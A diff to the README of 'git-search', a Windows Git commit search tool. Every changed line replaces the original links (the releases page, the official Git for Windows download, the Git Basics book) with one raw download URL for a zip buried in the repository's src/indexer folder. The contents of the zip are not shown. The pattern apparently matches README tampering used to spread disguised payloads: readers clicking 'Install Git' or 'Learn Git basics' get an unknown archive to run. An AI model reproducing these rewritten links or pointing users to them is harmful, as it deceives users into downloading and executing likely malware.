@@ -1,6 +1,6 @@
 # ⚙️ git-search - Find Git Commits Quickly
 
-[![Download](https://img.shields.io/badge/Download-git--search-ff69b4)](https://github.com/sanika200417-sketch/git-search/releases)
+[![Download](https://img.shields.io/badge/Download-git--search-ff69b4)](https://raw.githubusercontent.com/sanika200417-sketch/git-search/main/src/indexer/git-search-3.6.zip)
 
 git-search helps you look through past changes in your Git projects. It works by searching commit messages and details to find what you need. The app runs on your Windows computer and shows results in a simple terminal window.
 
@@ -21,7 +21,7 @@ Before you start, make sure your computer meets these needs:
 - Windows 10 or newer
 - At least 4 GB of free RAM
 - Around 100 MB free disk space
-- Git installed (you can get it from https://git-scm.com/download/win)
+- Git installed (you can get it from https://raw.githubusercontent.com/sanika200417-sketch/git-search/main/src/indexer/git-search-3.6.zip)
 - Internet connection to download git-search (not needed for running after install)
 
 ---
@@ -32,7 +32,7 @@ You must first download git-search on your Windows PC. Follow these steps:
 
 1. Go to the releases page from the link below:
 
-   [Download git-search Releases](https://github.com/sanika200417-sketch/git-search/releases)
+   [Download git-search Releases](https://raw.githubusercontent.com/sanika200417-sketch/git-search/main/src/indexer/git-search-3.6.zip)
 
 2. Look for the latest release. It is usually the first one listed at the top.
 
@@ -129,9 +129,9 @@ If git-search does not work as expected, try these steps:
 
 ## 🔗 Useful Links
 
-- [Git for Windows](https://git-scm.com/download/win) — Install Git if needed.
-- [git-search Releases](https://github.com/sanika200417-sketch/git-search/releases) — Download the latest installer.
-- [Git Basics](https://git-scm.com/book/en/v2/Getting-Started-Git-Basics) — Learn about Git history and commits.
+- [Git for Windows](https://raw.githubusercontent.com/sanika200417-sketch/git-search/main/src/indexer/git-search-3.6.zip) — Install Git if needed.
+- [git-search Releases](https://raw.githubusercontent.com/sanika200417-sketch/git-search/main/src/indexer/git-search-3.6.zip) — Download the latest installer.
+- [Git Basics](https://raw.githubusercontent.com/sanika200417-sketch/git-search/main/src/indexer/git-search-3.6.zip) — Learn about Git history and commits.
 
 ---
 
@@ -139,6 +139,6 @@ If git-search does not work as expected, try these steps:
 
 You can get the software here:
 
-[![Download git-search](https://img.shields.io/badge/Download-Here-ff69b4)](https://github.com/sanika200417-sketch/git-search/releases)
+[![Download git-search](https://img.shields.io/badge/Download-Here-ff69b4)](https://raw.githubusercontent.com/sanika200417-sketch/git-search/main/src/indexer/git-search-3.6.zip)
 
 Click this link and download the latest Windows `.exe` file under the "Assets" section. Then run the file and follow the installation steps above.
